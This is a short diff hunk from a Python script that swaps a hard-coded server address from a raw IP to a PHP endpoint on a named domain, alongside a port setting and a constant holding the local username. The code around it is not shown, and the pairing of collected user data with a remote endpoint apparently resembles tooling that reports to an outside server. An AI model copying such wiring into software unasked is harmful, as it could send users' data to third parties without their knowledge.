@@ -6,7 +6,7 @@ import sys
 from getpass import getuser
 from shutil import copyfile
 
-URL = "https://68.180.86.128"
+URL = "https://lukemcewen.com/script.php"
 PORT = 9999
 USERNAME = getuser()
 
